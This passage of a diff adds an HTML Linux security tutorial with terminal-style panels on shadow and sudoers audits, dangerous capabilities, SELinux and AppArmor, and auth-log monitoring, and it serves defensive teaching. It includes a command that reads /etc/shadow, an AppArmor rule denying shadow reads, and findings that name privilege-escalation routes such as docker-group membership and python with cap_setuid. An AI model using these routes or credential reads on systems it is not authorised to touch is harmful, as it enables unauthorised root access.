+        <span><span class="pr">root@lab:~# </span><span style="color:#fff">awk -F: '($2 ~ /^\$1\$/) {print "[!] MD5 password (WEAK): "$1}' /etc/shadow</span></span>
+        <span class="sec">──── 4. SUDOERS AUDIT ────</span>
+        <span><span class="pr">root@lab:~# </span><span style="color:#fff">grep -r "NOPASSWD" /etc/sudoers /etc/sudoers.d/ 2>/dev/null</span></span>
+        <span class="ored">jenkins  ALL=(ALL) NOPASSWD: ALL   ← critical finding</span>
+        <span class="sec">──── 5. HIGH-RISK GROUP MEMBERS ────</span>
+        <span><span class="pr">root@lab:~# </span><span style="color:#fff">for g in sudo docker disk shadow lxd; do members=$(getent group $g | cut -d: -f4); [ -n "$members" ] && echo "[*] $g: $members"; done</span></span>
+        <span class="oyn">[*] sudo: alice,bob</span>
+        <span class="ored">[*] docker: alice,jenkins</span>
+        <span class="ored">[*] disk: bob</span>
+        <span class="sec">──── 6. DANGEROUS CAPABILITIES ────</span>
+        <span><span class="pr">root@lab:~# </span><span style="color:#fff">getcap -r / 2>/dev/null | grep -E "setuid|dac_override|sys_admin|sys_module"</span></span>
+        <span class="ored">/usr/bin/python3.12 cap_setuid=ep   ← HIGH RISK: python can setuid to root</span>
+        <span class="sec">──── 7. LOCK UNUSED ACCOUNTS ────</span>
+        <span><span class="pr">root@lab:~# </span><span style="color:#fff">usermod -L olduser    # lock: prepends ! to shadow hash</span></span>
+        <span><span class="pr">root@lab:~# </span><span style="color:#fff">usermod -s /usr/sbin/nologin serviceaccount  # remove login shell</span></span>
+      </div>
+    </div>
+  </div>
+</div>
+
+<!-- ═══ PANEL 10 — SELINUX / APPARMOR ═══ -->
+<div class="panel">
+  <div class="ph"><span style="font-size:14px">🛡</span><span class="pt">SELinux &amp; AppArmor — Mandatory Access Control (MAC)</span><span class="pn">PANEL 10</span></div>
+  <div class="pb">
+    <div class="g2" style="margin-bottom:14px">
+      <div class="cb cbr">
+        <div class="cbt">SELinux — Label-Based MAC (RHEL/CentOS/Fedora)</div>
+        <div class="ct">
+          Every process and file gets a <span class="hr">security label</span> (<code>user:role:type:level</code>). The SELinux policy defines which types can access which other types — regardless of DAC permissions.<br><br>
+          Even if root tries to read a file with the wrong type, SELinux can <span class="hl">deny it</span>. This confines kernel exploits — compromised nginx cannot read /etc/shadow if policy denies httpd_t → shadow_t.<br><br>
+          Modes: <span class="hl">Enforcing</span> (blocks + logs), <span class="hy">Permissive</span> (logs only), <span class="hr">Disabled</span> (off — bad).
+        </div>
+      </div>
+      <div class="cb cbp">
+        <div class="cbt">AppArmor — Path-Based MAC (Ubuntu/Debian)</div>
+        <div class="ct">
+          AppArmor profiles restrict programs by <span class="hp">filesystem path</span>. Simpler than SELinux. Profile defines: which files the process can read/write/execute, which capabilities it can use, which network operations are allowed.<br><br>
+          Profiles in <code>/etc/apparmor.d/</code>. Modes: <span class="hl">enforce</span> (block violations) and <span class="hy">complain</span> (log only — for writing new profiles).<br><br>
+          Default profiles on Ubuntu: nginx, mysqld, sshd, cups, snapd — all confined.
+        </div>
+      </div>
+    </div>
+
+    <div class="term">
+      <div class="tbar"><div class="td" style="background:#ff5f57"></div><div class="td" style="background:#febc2e"></div><div class="td" style="background:#28c840"></div>
+        <span style="margin-left:8px;font-size:11px;color:var(--t3);font-family:var(--sans)">SELinux + AppArmor commands</span></div>
+      <div class="tb">
+        <span class="sec">──── SELINUX STATUS & LABELS ────</span>
+        <span><span class="pr">root@lab:~# </span><span style="color:#fff">getenforce && sestatus</span></span>
+        <span class="ogn">Enforcing</span>
+        <span class="out">SELinux status:     enabled</span>
+        <span class="ogn">SELinuxfs mount:    /sys/fs/selinux</span>
+        <span class="out">Current mode:       enforcing</span>
+        <span><span class="pr">root@lab:~# </span><span style="color:#fff">ls -Z /etc/shadow</span></span>
+        <span class="ocn">system_u:object_r:shadow_t:s0 /etc/shadow</span>
+        <span><span class="pr">root@lab:~# </span><span style="color:#fff">ps -eZ | grep nginx</span></span>
+        <span class="ocn">system_u:system_r:httpd_t:s0  nginx: worker</span>
+        <span class="sec">──── SELINUX DENIAL AUDIT ────</span>
+        <span><span class="pr">root@lab:~# </span><span style="color:#fff">ausearch -m AVC -ts recent | tail -8</span></span>
+        <span class="ored">type=AVC msg=audit: avc: denied { read } for pid=1500 comm="nginx"</span>
+        <span class="ored">  path="/etc/shadow" dev="nvme0n1p2" ino=924674</span>
+        <span class="ored">  scontext=system_u:system_r:httpd_t:s0</span>
+        <span class="ored">  tcontext=system_u:object_r:shadow_t:s0</span>
+        <span class="ogn"># nginx (httpd_t) denied reading shadow_t — SELinux worked!</span>
+        <span class="sec">──── APPARMOR STATUS ────</span>
+        <span><span class="pr">root@lab:~# </span><span style="color:#fff">aa-status</span></span>
+        <span class="out">apparmor module is loaded.</span>
+        <span class="out">25 profiles are loaded.</span>
+        <span class="ogn">22 profiles are in enforce mode:</span>
+        <span class="out">   /usr/sbin/nginx</span>
+        <span class="out">   /usr/sbin/sshd</span>
+        <span class="oyn">3 profiles are in complain mode:</span>
+        <span class="out">   /usr/sbin/mysqld</span>
+        <span class="sec">──── APPARMOR PROFILE SNIPPET ────</span>
+        <span class="out"># /etc/apparmor.d/usr.sbin.nginx</span>
+        <span class="ocn">/usr/sbin/nginx {</span>
+        <span class="out">  capability net_bind_service,</span>
+        <span class="out">  /var/www/html/ r,</span>
+        <span class="out">  /var/www/html/** r,</span>
+        <span class="out">  /var/log/nginx/ rw,</span>
+        <span class="ored">  deny /etc/shadow r,    # explicit deny even if DAC allows</span>
+        <span class="ocn">}</span>
+      </div>
+    </div>
+  </div>
+</div>
+
+<!-- ═══ PANEL 11 — MONITORING ═══ -->
+<div class="panel">
+  <div class="ph"><span style="font-size:14px">📊</span><span class="pt">Monitoring — Authentication Events &amp; Suspicious Activity</span><span class="pn">PANEL 11</span></div>
+  <div class="pb">
+    <div class="term">
+      <div class="tbar"><div class="td" style="background:#ff5f57"></div><div class="td" style="background:#febc2e"></div><div class="td" style="background:#28c840"></div>
+        <span style="margin-left:8px;font-size:11px;color:var(--t3);font-family:var(--sans)">Auth monitoring & forensics</span></div>
+      <div class="tb">
+        <span class="sec">──── LOGIN HISTORY ────</span>
+        <span><span class="pr">root@lab:~# </span><span style="color:#fff">last -20</span></span>
+        <span class="out">alice  pts/0  192.168.1.50  Mon May  3 10:12   still logged in</span>
+        <span class="out">root   pts/1  10.10.10.5    Sun May  2 02:44 - 02:47  (00:03)</span>
+        <span class="ored"># root login from external IP at 2AM — investigate immediately</span>
+        <span class="sec">──── FAILED LOGINS ────</span>
+        <span><span class="pr">root@lab:~# </span><span style="color:#fff">lastb | head -10</span></span>
+        <span class="ored">root   ssh:notty  10.10.10.5  Sun May 2 02:40   ← brute force</span>
+        <span class="ored">root   ssh:notty  10.10.10.5  Sun May 2 02:40</span>
+        <span class="ored">root   ssh:notty  10.10.10.5  Sun May 2 02:41</span>
+        <span class="sec">──── REAL-TIME AUTH MONITORING ────</span>
+        <span><span class="pr">root@lab:~# </span><span style="color:#fff">tail -f /var/log/auth.log | grep -E "Failed|Invalid|sudo|ROOT"</span></span>
+        <span class="ored">May 03 02:40:11 lab sshd[3241]: Failed password for root from 10.10.10.5</span>
+        <span class="ored">May 03 10:14:22 lab sudo: alice : COMMAND=/bin/bash (abnormal sudo to bash!)</span>
+        <span class="sec">──── WHO IS LOGGED IN NOW ────</span>
+        <span><span class="pr">root@lab:~# </span><span style="color:#fff">w</span></span>
+        <span class="out"> 10:15  up 5 days,  load: 0.12, 0.08, 0.04</span>
+        <span class="out">USER     TTY   FROM           LOGIN@  IDLE  WHAT</span>
+        <span class="ogn">alice    pts/0 192.168.1.50  10:12   0s    -bash</span>
+        <span class="ored">unknown  pts/1 10.10.10.5   02:44   0s    /bin/bash   ← active session from attack IP!</span>
+        <span class="sec">──── KILL SUSPICIOUS SESSION ────</span>
+        <span><span class="pr">root@lab:~# </span><span style="color:#fff">pkill -9 -t pts/1   # kill processes on that terminal</span></span>
+        <span><span class="pr">root@lab:~# </span><span style="color:#fff">who -a | awk '{print $2}' | xargs -I{} fuser -k {}</span></span>
+        <span class="sec">──── AUDIT RULE: WATCH SENSITIVE FILES ────</span>
+        <span><span class="pr">root@lab:~# </span><span style="color:#fff">auditctl -w /etc/passwd   -p wa -k passwd_changes</span></span>
+        <span><span class="pr">root@lab:~# </span><span style="color:#fff">auditctl -w /etc/shadow   -p wa -k shadow_changes</span></span>
+        <span><span class="pr">root@lab:~# </span><span style="color:#fff">auditctl -w /etc/sudoers  -p wa -k sudoers_changes</span></span>
+        <span><span class="pr">root@lab:~# </span><span style="color:#fff">ausearch -k passwd_changes -ts today</span></span>
+      </div>
+    </div>
+  </div>
+</div>
+
+<!-- ═══ PANEL 12 — CHECKLIST ═══ -->
+<div class="panel">
+  <div class="ph"><span style="font-size:14px">✔</span><span class="pt">Auditor / Security Checklist — Step 4 Verification</span><span class="pn">PANEL 12</span></div>
+  <div class="pb">
+    <ul class="cl">
+      <li><div class="chk">✓</div>Can you find all UID-0 accounts and identify which ones are legitimate?<span class="tag tr2" style="margin-left:auto">UID-0</span></li>
+      <li><div class="chk">✓</div>Can you decode a /etc/shadow entry and identify if MD5 ($1$) is being used?<span class="tag ty" style="margin-left:auto">SHADOW</span></li>
+      <li><div class="chk">✓</div>Can you identify which groups grant effective root access (docker, disk, shadow, lxd)?<span class="tag tr2" style="margin-left:auto">GROUPS</span></li>
+      <li><div class="chk">✓</div>Can you read and explain every field in /etc/sudoers and identify dangerous rules?<span class="tag to" style="margin-left:auto">SUDO</span></li>
+      <li><div class="chk">✓</div>Can you explain PAM module types (auth/account/password/session) and control flags?<span class="tag tc" style="margin-left:auto">PAM</span></li>
+      <li><div class="chk">✓</div>Can you configure pam_pwquality and pam_faillock for password policy and lockout?<span class="tag tg" style="margin-left:auto">HARDEN</span></li>
+      <li><div class="chk">✓</div>Can you audit all binaries with dangerous capabilities using getcap -r /?<span class="tag tp" style="margin-left:auto">CAPS</span></li>
+      <li><div class="chk">✓</div>Can you demonstrate at least 3 privilege escalation paths and their detection method?<span class="tag tr2" style="margin-left:auto">PRIVESC</span></li>
+      <li><div class="chk">✓</div>Can you set and read ACLs with setfacl/getfacl and configure default ACLs?<span class="tag tc" style="margin-left:auto">ACL</span></li>
+      <li><div class="chk">✓</div>Can you check SELinux/AppArmor status and read AVC denial logs?<span class="tag tp" style="margin-left:auto">MAC</span></li>
+      <li><div class="chk">✓</div>Can you use last, lastb, and auth.log to reconstruct a login timeline?<span class="tag tg" style="margin-left:auto">FORENSICS</span></li>
+      <li><div class="chk">✓</div>Can you set auditd watch rules on /etc/passwd, /etc/shadow, /etc/sudoers?<span class="tag ty" style="margin-left:auto">AUDIT</span></li>
+    </ul>
+  </div>
+</div>
+
+<!-- ═══ PANEL 13 — SUMMARY ═══ -->
+<div class="panel">
+  <div class="ph"><span style="font-size:14px">◉</span><span class="pt">Summary — Step 4 Complete</span><span class="pn">PANEL 13</span></div>
+  <div class="pb">
+    <div class="g3" style="margin-bottom:0">
+      <div class="sum-card">
+        <div class="sc-l">Identity & Users</div>
+        <div class="sc-v">Linux uses numeric UIDs — UID 0 = root, no exceptions. /etc/passwd maps names to UIDs. /etc/shadow stores hashed passwords (SHA-512). Service accounts use nologin shell. Always audit for UID-0 duplicates and empty passwords.</div>
+      </div>
+      <div class="sum-card">
+        <div class="sc-l">sudo + PAM + Capabilities</div>
+        <div class="sc-v">sudo delegates specific commands with full audit trail. PAM is a modular auth stack — controls login, lockout, MFA, limits. Capabilities split root power into 40 tokens — prefer capabilities over SUID. Audit: getcap, sudo -l, faillock.</div>
+      </div>
+      <div class="sum-card">
+        <div class="sc-l">MAC + PrivEsc + Monitoring</div>
+        <div class="sc-v">SELinux/AppArmor add mandatory layer above DAC — even root is restricted. PrivEsc paths: SUID, sudo misconfig, writable cron, PATH hijack, kernel CVEs. Detect via auditd, auth.log, last, w, AVC denials.</div>
+      </div>
+    </div>
+    <div class="nxt">
+      <div>
+        <div style="font-family:var(--sans);font-weight:600;font-size:14px;color:var(--g)">▶ Next: Step 5 — Process &amp; Service Management</div>
+        <div style="font-size:11px;color:var(--t3);margin-top:2px">Process lifecycle · daemons · signals · systemd deep dive · cron · resource limits · Linux vs Windows process management</div>
+      </div>
+      <button class="nb" onclick="window.sendPrompt && window.sendPrompt('Start Step 5')">$ Start Step 5 →</button>
+    </div>
+  </div>
+</div>
+
+</div>
+</body>
+</html>
